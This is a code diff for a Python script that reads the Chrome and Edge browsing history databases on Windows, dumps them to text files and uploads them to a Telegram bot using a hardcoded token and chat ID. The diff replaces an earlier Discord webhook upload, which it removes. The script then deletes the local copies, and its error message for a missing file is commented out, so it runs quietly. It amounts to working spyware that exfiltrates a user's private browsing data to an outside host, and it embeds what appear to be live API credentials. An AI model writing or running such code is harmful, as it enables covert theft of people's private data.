@@ -2,17 +2,14 @@ import os
 import shutil
 import sqlite3
 import sys
-import requests
+import time
+import requests, json
 
 def get_edge_history_path():
     """Determines the default Edge History file path based on the OS."""
     home = os.path.expanduser("~")
     if sys.platform.startswith("win"):
         return os.path.join(home, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "History")
-    elif sys.platform.startswith("darwin"):
-        return os.path.join(home, "Library", "Application Support", "Microsoft Edge", "Default", "History")
-    elif sys.platform.startswith("linux"):
-        return os.path.join(home, ".config", "microsoft-edge", "Default", "History")
     else:
         raise OSError("Unsupported operating system.")
 
@@ -21,10 +18,6 @@ def get_chrome_history_path():
     home = os.path.expanduser("~")
     if sys.platform.startswith("win"):
         return os.path.join(home, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "History")
-    elif sys.platform.startswith("darwin"):
-        return os.path.join(home, "Library", "Application Support", "Google", "Chrome", "Default", "History")
-    elif sys.platform.startswith("linux"):
-        return os.path.join(home, ".config", "google-chrome", "Default", "History")
     else:
         raise OSError("Unsupported operating system.")
 
@@ -67,10 +60,6 @@ def process_browser_history(history_path, browser_name):
         
         print(f"Success: extracted {browser_name} history to {output_file}")
         cursor.close()
-
-    except sqlite3.OperationalError as e:
-        print(f"Database error on {browser_name}: {e}.")
-        print("-> Please close your browser completely and run the script again.")
     except Exception as e:
         print(f"An error occurred while processing {browser_name}: {e}")
     finally:
@@ -80,10 +69,7 @@ def process_browser_history(history_path, browser_name):
         
         # Now Windows will safely allow you to remove the temp file
         if os.path.exists(temp_db):
-            try:
-                os.remove(temp_db)
-            except OSError as e:
-                print(f"Cleanup warning: Could not remove {temp_db}. {e}")
+            os.remove(temp_db)
                 
     return False
 
@@ -104,15 +90,55 @@ def fetch_history():
 
 if __name__ == "__main__":
     fetch_history()
+    TOKEN = '8683412588:AAGgmtFQqw7En-nIe0pgNGFUGvfBBup_3UI'
+    CHAT_ID = '936154719'
+    url = f"https://api.telegram.org/bot{TOKEN}/sendMediaGroup"
+    file_paths = ["edge_history_output.txt", "chrome_history_output.txt"]
 
-    webhook_url = "https://discord.com/api/webhooks/1515633235831558244/gR0lZeizliYYjaAa1LGIF0ixUAX7fe4bpeZbvicyqUynCpslFBPua7qbQGhh-8ByZew0"
-    file_path = ["edge_history_output.txt", "chrome_history_output.txt"]
-    for path in file_path:
-        with open(path, "rb") as f:
-            # The key MUST be named 'file'
-            response = requests.post(webhook_url, files={"file": f})
+    files = {}
+    media = []
+
+    # Double-check that files exist before trying to send
+    for path in file_paths:
+        if not os.path.exists(path):
+            # time.sleep(2)
+            # print(f"Error: The file '{path}' was not found. Please check the path.")
+            exit()
+
+    # Open the files and map them correctly
+    for i, path in enumerate(file_paths):
+        file_key = f"doc_{i}"  # Dynamic key for Telegram
+        
+        # Open the file in binary mode
+        files[file_key] = open(path, 'rb')
+        
+        # The 'media' string MUST point exactly to 'attach://<file_key>'
+        media.append({
+            'type': 'document',
+            'media': f'attach://{file_key}'
+        })
+
+    payload = {
+        'chat_id': CHAT_ID,
+        'media': json.dumps(media)  # Converts the list to a JSON string
+    }
+
+    try:
+        # Send the POST request
+        response = requests.post(url, data=payload, files=files)
+        
+        if response.status_code == 200:
+            print("All files sent successfully!")
+        else:
+            print(f"Telegram Error: {response.text}")
+
+    finally:
+        # Crucial: Always close the files so windows/linux releases them
+        for f in files.values():
+            f.close()
 
 
     if os.path.exists("edge_history_output.txt") and os.path.exists("chrome_history_output.txt"):
             os.remove("edge_history_output.txt")
             os.remove("chrome_history_output.txt")
+
